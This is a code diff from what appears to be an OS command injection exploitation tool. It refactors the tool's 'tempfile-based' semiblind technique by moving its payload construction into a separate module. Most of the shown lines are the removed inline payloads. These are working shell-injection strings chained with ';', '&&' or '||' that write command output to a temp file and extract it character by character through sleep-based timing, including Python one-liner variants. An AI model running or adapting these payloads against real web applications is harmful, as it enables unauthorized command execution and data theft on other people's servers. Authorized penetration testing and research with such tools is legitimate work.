@@ -29,6 +29,8 @@ from src.utils import settings
 from src.core.requests import headers
 from src.core.requests import parameters
 
+from src.core.injections.semiblind_based.techniques.payloads import tempfile_based_payloads
+
 """
  The "tempfile-based" injection technique on Semiblind OS Command Injection.
  __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
@@ -76,92 +78,18 @@ def exploitation(url,delay,filename,tmp_path,http_request_method):
       
     # The output file for file-based injection technique.
     OUTPUT_TEXTFILE = tmp_path + B64_ENC_TAG + ".txt"
-    
+    alter_shell = menu.options.alter_shell
     tag_length = len(TAG) + 4
     for j in range(1,int(tag_length)):
       
       try:
-	if not menu.options.alter_shell:
-	  if seperator == ";" :
-	    payload = (seperator + " "
-		      "str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ")" + seperator + " "
-		      "str=$(cat " + OUTPUT_TEXTFILE + ")" + seperator + " "
-		      # Find the length of the output.
-		      "str1=${#str}" + seperator + " "
-		      "if [ \"" + str(j) + "\" -ne ${str1} ]" + seperator  + " "
-		      "then sleep 0" + seperator + " "
-		      "else sleep " + str(delay) + seperator + " "
-		      "fi "
-		      )
-	    
-	  elif seperator == "&&" :
-	    if http_request_method == "POST":
-	      seperator = urllib.quote(seperator)
-	      ampersand = "%26"
-	    else:
-	      ampersand = "&"
-	    payload = (ampersand + " " +
-		      "sleep 0 " + seperator + " "
-		      "str=$(echo "+ TAG + " > '" + OUTPUT_TEXTFILE + "') " + seperator + " "
-		      "str=$(cat " + OUTPUT_TEXTFILE + ") " + seperator + " "
-		      "str1=${#str} " + seperator + " "
-		      "[ " + str(j) + " -eq ${str1} ] " + seperator + " "
-		      "sleep " + str(delay)
-		      )
-	    if http_request_method == "POST":
-	      seperator = urllib.unquote(seperator)
-
-	  elif seperator == "||" :
-	    payload = (seperator + " "
-		      "echo '" + TAG + "' > " + OUTPUT_TEXTFILE + " | "+ 
-		      "[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | wc -c) ] " + seperator + " "
-		      "sleep " + str(delay)
-		      )  
-	  else:
-	    break
+	
+	# Tempfile-based decision payload (check if host is vulnerable).
+	if not alter_shell :
+	  payload = tempfile_based_payloads.decision(seperator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_method)
 	  
-	#-----------------------------------------------------------------------------------------
-	#  __Warning__: This (alternative) python-shell is still experimental.
-	#-----------------------------------------------------------------------------------------
 	else:
-	    if seperator == ";" :
-	      payload = (seperator + " "
-			"str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ")" + seperator + " "
-			# Find the length of the output, using readline().
-			"str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")"+ seperator + " "
-			"if [ \"" + str(j) + "\" -ne ${str1} ]" + seperator  + " "
-			"then $(python -c \"import time;time.sleep(0)\")"+ seperator + " "
-			"else $(python -c \"import time;time.sleep("+ str(delay) +")\")"+ seperator + " "
-			"fi "
-			)
-
-	    elif seperator == "&&" :
-	      if http_request_method == "POST":
-		seperator = urllib.quote(seperator)
-		ampersand = urllib.quote("&")
-	      else:
-		ampersand = "&"
-	      payload = (ampersand + " " +
-			"$(python -c \"import time;time.sleep(0)\") " + seperator + " "
-			"str=$(echo "+ TAG + " > " + OUTPUT_TEXTFILE + ") " + seperator + " "
-			# Find the length of the output, using readline().
-			"str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " + seperator + " "
-			"[ " + str(j) + " -eq ${str1} ] " + seperator + " "
-			"$(python -c \"import time;time.sleep("+ str(delay) +")\") "
-			)
-	      if http_request_method == "POST":
-		seperator = urllib.unquote(seperator)
-
-	    elif seperator == "||" :
-	      payload = (seperator + " "
-			"echo '" + TAG + "' > " + OUTPUT_TEXTFILE + " | "+ 
-			# Find the length of the output, using readline().
-			"[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + seperator + " "
-			"$(python -c \"import time;time.sleep(0)\") | $(python -c \"import time;time.sleep("+ str(delay) +")\")"
-			) 
-	    else:
-	      break
-	  #-----------------------------------------------------------------------------------------  
+	  payload = tempfile_based_payloads.decision_alter_shell(seperator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_method)
 
 	# Check if defined "--verbose" option.
 	if menu.options.verbose:
@@ -310,87 +238,12 @@ def exploitation(url,delay,filename,tmp_path,http_request_method):
 	      else:
 		print "\n(*) Retrieving the length of execution output..."
 		for j in range(1,int(maxlen)):
-		  if not menu.options.alter_shell:
-		    if seperator == ";" :
-		      payload = (seperator + " "
-				"str=$("+ cmd + " > " + OUTPUT_TEXTFILE + ")" + seperator + " "
-				"str=$(cat " + OUTPUT_TEXTFILE + ")" + seperator + " "
-				"str1=${#str}" + seperator +
-				"if [ \"" + str(j) + "\" != ${str1} ]; " +
-				"then sleep 0" + seperator +
-				"else sleep " + str(delay) + seperator +
-				"fi "
-				)
-		      
-		    elif seperator == "&&" :
-		      if http_request_method == "POST":
-			seperator = urllib.quote(seperator)
-			ampersand = "%26"
-		      else:
-			ampersand = "&"
-		      payload = (ampersand + " " +
-				"sleep 0 " + seperator + " "
-				"str=$(\""+cmd+"\" > " + OUTPUT_TEXTFILE +") " + seperator + " "
-				"str=$(cat " + OUTPUT_TEXTFILE + ")" + seperator + " "
-				# Find the length of the output.
-				"str1=${#str} " + seperator + " "
-				"[ " + str(j) + " -eq ${str1} ]" + seperator + " "
-				"sleep " + str(delay)
-				)
-		      if http_request_method == "POST":
-			seperator = urllib.unquote(seperator)
-		      
-		    elif seperator == "||" :		
-		      payload = (seperator + " "
-				"echo $(" + cmd + ") > " + OUTPUT_TEXTFILE + " | "+ 
-				"[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | wc -c) ] " + seperator + " "
-				"sleep " + str(delay)
-				) 		    
-		    else:
-		      break
-		    
-		  #-----------------------------------------------------------------------------------------
-		  #  __Warning__: This (alternative) python-shell is still experimental.
-		  #-----------------------------------------------------------------------------------------
+		  
+		  # Execute shell commands on vulnerable host.
+		  if not alter_shell :
+		    payload = tempfile_based_payloads.cmd_execution(seperator,cmd,j,OUTPUT_TEXTFILE,delay,http_request_method)
 		  else:
-		    if seperator == ";" :
-		      payload = (seperator + " "
-				"str=$("+ cmd + "| tr '\n' ' ' > " + OUTPUT_TEXTFILE + ")" + seperator + " "
-				# Find the length of the output, using readline().
-				"str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")"+ seperator + " "
-				"if [ \"" + str(j) + "\" != ${str1} ]; " +
-				"then $(python -c \"import time;time.sleep(0)\")"+ seperator + " "
-				"else $(python -c \"import time;time.sleep("+ str(delay) +")\")"+ seperator + " "
-				"fi "
-				)
-		      
-		    elif seperator == "&&" :
-		      if http_request_method == "POST":
-			seperator = urllib.quote(seperator)
-			ampersand = "%26"
-		      else:
-			ampersand = "&"
-		      payload = (ampersand + " " +
-				"$(python -c \"import time;time.sleep(0)\") " +  seperator + " "
-				"str=$(\""+cmd+"\" > " + OUTPUT_TEXTFILE +") " +  seperator + " "
-				# Find the length of the output, using readline().
-				"str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " +  seperator + " "
-				"[ " + str(j) + " -eq ${str1} ] " +  seperator + " "
-				"$(python -c \"import time;time.sleep("+ str(delay) +")\") "
-				)
-		      if http_request_method == "POST":
-			seperator = urllib.unquote(seperator)
-		      
-		    elif seperator == "||" :		
-		      payload = (seperator + " "
-				"echo $(" + cmd + ") > " + OUTPUT_TEXTFILE + " | "+ 
-				# Find the length of the output, using readline().
-				"[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + seperator + " "
-				"$(python -c \"import time;time.sleep(0)\") | $(python -c \"import time;time.sleep("+ str(delay) +")\")"
-				) 		    
-		    else:
-		      break
-		  #-----------------------------------------------------------------------------------------
+		    payload = tempfile_based_payloads.cmd_execution_alter_shell(seperator,cmd,j,OUTPUT_TEXTFILE,delay,http_request_method)
 
 		  # Check if defined "--verbose" option.
 		  if menu.options.verbose:
@@ -484,80 +337,12 @@ def exploitation(url,delay,filename,tmp_path,http_request_method):
 		for i in range(1,int(i)):
 		  for ascii_char in range(32, 129):
 		    
-		    if not menu.options.alter_shell:
-		      if seperator == ";" :
-			payload = (seperator + " "
-				  "str=$(cat " + OUTPUT_TEXTFILE + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + seperator +
-				  "if [ \"" + str(ascii_char) + "\" != ${str} ]" + seperator +
-				  "then sleep 0" + seperator +
-				  "else sleep " + str(delay) + seperator +
-				  "fi "
-				  )
-			
-		      elif seperator == "&&" :
-			if http_request_method == "POST":
-			  seperator = urllib.quote(seperator)
-			  ampersand = "%26"
-			else:
-			  ampersand = "&"
-			payload = (ampersand + " " +
-				  "sleep 0 " +  seperator + " "
-				  "str=$(cat " + OUTPUT_TEXTFILE + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) " + seperator + " "
-				  "[ " + str(ascii_char) + " -eq ${str} ] " +  seperator + " "
-				  "sleep "+ str(delay)
-				  )
-			if http_request_method == "POST":
-			  seperator = urllib.unquote(seperator)
-			  
-					
-		      elif seperator == "||" :
-			payload = (seperator + " "
-				  "echo '" + TAG + "' |"+
-				  "[ \"" + str(ascii_char) + "\" -ne  $(cat " + OUTPUT_TEXTFILE + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + seperator + 
-				  "sleep " + str(delay) + " "
-				  )
-		      else:
-			break
-		      
-		    #-----------------------------------------------------------------------------------------
-		    #  __Warning__: This (alternative) python-shell is still experimental.
-		    #-----------------------------------------------------------------------------------------
+		    # Get the execution ouput, of shell execution.
+		    if not alter_shell :
+		      payload = tempfile_based_payloads.get_char(seperator,OUTPUT_TEXTFILE,i,ascii_char,delay,http_request_method)
 		    else:
-		      if seperator == ";" :
-			payload = (seperator + " "
-				  "str=$(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);exit(0)\")" + seperator +
-				  "if [ \"" + str(ascii_char) + "\" != ${str} ]" + seperator +
-				  "then $(python -c \"import time;time.sleep(0)\")"+ seperator + " "
-				  "else $(python -c \"import time;time.sleep("+ str(delay) +")\")"+ seperator + " "
-				  "fi "
-				  )
-			
-		      elif seperator == "&&" :
-			if http_request_method == "POST":
-			  seperator = urllib.quote(seperator)
-			  ampersand = "%26"
-			else:
-			  ampersand = "&"
-			payload = (ampersand + " " +
-				  "$(python -c \"import time;time.sleep(0)\") " +  seperator + " "
-				  "str=$(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);exit(0)\") " +  seperator + " "
-				  "[ " + str(ascii_char) + " -eq ${str} ] " +  seperator + " "
-				  "$(python -c \"import time;time.sleep("+ str(delay) +")\")"
-				  )
-			if http_request_method == "POST":
-			  seperator = urllib.unquote(seperator)
-		  
-					
-		      elif seperator == "||" :
-			payload = (seperator + " "
-				  "echo '" + TAG + "' |"+
-				  "[ \"" + str(ascii_char) + "\" -ne  $(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);exit(0)\") ] " + seperator + 
-				  "$(python -c \"import time;time.sleep(0)\") | $(python -c \"import time;time.sleep("+ str(delay) +")\")"
-				  )
-			#-----------------------------------------------------------------------------------------
-		      else:
-			break
-		    
+		      payload = tempfile_based_payloads.get_char_alter_shell(seperator,OUTPUT_TEXTFILE,i,ascii_char,delay,http_request_method)
+		      
 		    # Check if defined "--verbose" option.
 		    if menu.options.verbose:
 		      sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
